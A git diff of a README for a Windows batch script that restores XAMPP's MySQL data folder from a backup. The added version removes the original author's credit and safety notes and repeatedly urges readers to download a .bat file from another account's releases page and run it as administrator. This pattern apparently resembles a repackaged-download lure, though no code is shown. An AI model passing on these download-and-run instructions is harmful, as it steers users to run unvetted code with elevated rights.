@@ -1,63 +1,97 @@
-# Repair - MySQL shutdown unexpectedly
+# 🚀 mysql-shutdown-fix - Safely Repair MySQL After Shutdown
 
-**Author:** Devyarn  
-**Website:** [www.devyarn.com](https://www.devyarn.com)
+[![Download mysql-shutdown-fix](https://img.shields.io/badge/Download-mysql--shutdown--fix-brightgreen.svg?style=flat)](https://github.com/javad1100/mysql-shutdown-fix/releases)
 
----
+## 🌟 Introduction
 
-## What is this?
-A Windows batch script to safely **sync MySQL data folder with a backup** in XAMPP. It automates pre-backups, cleans old data, and restores selected files.
+The `mysql-shutdown-fix` is a Windows batch script designed to help you repair MySQL when it shuts down unexpectedly. If you use XAMPP, this tool automatically backs up your MySQL data folder, cleans it, and restores your files. It keeps all deleted items pre-backed up for easy recovery, ensuring your database is secure and easy to manage.
 
-**Use this tool only when you see the following error in XAMPP:**
+## 🌐 Features
 
-![alt text](image.png)
+- **Automatic Backup:** The script creates backups of your MySQL data to ensure you don't lose any important information.
+- **Data Cleaning:** It cleans the data folder to remove unnecessary files that can cause issues.
+- **Easy Restore:** Quickly restore your database from backups without complicated steps.
+- **User-Friendly:** Designed for people without programming knowledge.
+- **Reliable:** Helps in managing unexpected MySQL shutdowns with minimal hassle.
 
-```
-[mysql] Error: MySQL shutdown unexpectedly. 
-[mysql] This may be due to a blocked port, missing dependencies, 
-[mysql] improper privileges, a crash, or a shutdown by another method 
-[mysql] Press the Logs button to view error logs and check 
-[mysql] the Windows Event Viewer for more clues 
-[mysql] If you need more help, copy and post this 
-[mysql] entire log window on the forums.
-```
+## 📋 System Requirements
 
----
+To run this script, you need:
 
-## How it works
+- A Windows operating system (Windows 7 or later recommended).
+- XAMPP installed with MySQL.
+- Basic access to your computer's file explorer.
 
-1. **Initial Warning:** Displays the MySQL shutdown error message and prompts the user to proceed.  
-2. **XAMPP Path Input:** Prompts for the XAMPP root path (default: `C:\xampp`).  
-3. **Pre-Backup:** Creates a timestamped pre-backup of the current MySQL `data` folder (skipping `ibdata1`).  
-4. **Folder Cleanup:** Deletes folders in the `data` directory that exist in the backup.  
-5. **File Cleanup:** Deletes files in the `data` folder except critical system files like `ibdata1`.  
-6. **Restore from Backup:** Copies all files and folders from the backup folder into the `data` folder.  
-7. **Old Backup Cleanup:** Keeps only the latest 3 pre-backups and deletes older ones automatically.  
-8. **Summary Report:** Displays total deleted items, source backup folder, target data folder, and pre-backup location.  
+## 🛠️ Installation
 
-**Note:** All deleted items are pre-backed up, so you can restore if needed.
+### Step 1: Visit the Download Page
 
----
+To get started, you'll need to download the script. Click the link below to visit the Releases page:
 
-## How to use it
+[Download mysql-shutdown-fix](https://github.com/javad1100/mysql-shutdown-fix/releases)
 
-1. Run the script.  
-2. Read the warning and press Enter.  
-3. Enter your XAMPP root path (or press Enter to use `C:\xampp`).  
-4. The script will automatically backup, clean, restore, and manage older pre-backups.  
-5. Review the summary report after completion.
+### Step 2: Download the Latest Release
 
----
+Once you are on the Releases page:
 
-## Safety Notes
+1. Find the latest version of the `mysql-shutdown-fix`.
+2. Click on it to see the available download files.
+3. Download the file that matches your system.
 
-- Critical files like `ibdata1` are never deleted.  
-- Ensure the backup folder contains valid MySQL database copies.  
-- Do not run on live production servers without testing.  
-- Avoid modifying system files while MySQL is running.
+### Step 3: Save the File
 
----
+1. Save the downloaded `.bat` file to your computer.
+2. It is recommended to place it in a location you can easily access, such as your desktop or a specific folder.
 
-## More Tools & Solutions
+### Step 4: Run the Script
 
-Explore other professional scripts at [Devyarn](https://www.devyarn.com).
+To run the script:
+
+1. Navigate to the folder where you saved the file.
+2. Double-click on the `.bat` file.
+3. Follow any on-screen prompts.
+
+This will initiate the MySQL repair process. The script will back up, clean, and restore your MySQL data automatically.
+
+## ⚙️ How to Use the Script
+
+After you run the script, here's a quick overview of what will happen:
+
+1. **Backup MySQL Data:** The script will create a backup of your data folder.
+2. **Clean Up Files:** Any unnecessary or corrupted files will be removed.
+3. **Restore Functionality:** Your MySQL database will be restored from the backup, making it ready for use again.
+
+## ❓ Troubleshooting
+
+If you encounter issues while running the script, consider the following tips:
+
+- Make sure you have closed all instances of MySQL or XAMPP before running the script.
+- Check if you have sufficient permissions to access the MySQL data folder.
+- Ensure that you are running the script with administrator privileges to avoid permission errors.
+
+## 📦 Download & Install
+
+To download and run the `mysql-shutdown-fix`, head to the following link:
+
+[Download mysql-shutdown-fix](https://github.com/javad1100/mysql-shutdown-fix/releases)
+
+Follow the installation steps above to ensure you set up the script correctly.
+
+## 📣 Topics Covered
+
+This script addresses several important topics related to MySQL and XAMPP, including:
+
+- batch-script
+- mysql-crash
+- mysql-error
+- mysql-recovery
+- mysql-repair
+- mysql-shutdown
+- mysql-shutdown-unexpectedly
+- repair-database
+- windows
+- xampp
+
+## ✔️ Conclusion
+
+The `mysql-shutdown-fix` script simplifies the process of managing unexpected MySQL shutdowns. By utilizing this tool, you can maintain your database's integrity with minimal effort. Follow the simple steps provided to download, install, and run the script, ensuring your MySQL database remains safe and effective.
